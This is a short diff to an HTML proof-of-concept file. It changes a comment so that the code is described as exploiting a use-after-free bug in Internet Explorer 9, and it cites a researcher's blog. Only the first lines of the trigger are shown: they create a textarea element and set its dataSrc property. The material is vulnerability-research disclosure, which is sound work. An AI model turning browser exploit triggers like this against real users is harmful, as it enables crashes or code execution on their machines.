@@ -1,6 +1,7 @@
 <!doctype html>
 <script>
-  // This PoC attempts to exploit a memory disclosure bug in VBScript.dll
+  // This PoC attempts to exploit a use-after-free bug in Microsoft Internet
+  // Explorer 9
   // See http://blog.skylined.nl/20161101001.html for details.
   oTextArea = document.createElement('textarea');
   oTextArea.dataSrc = 1;
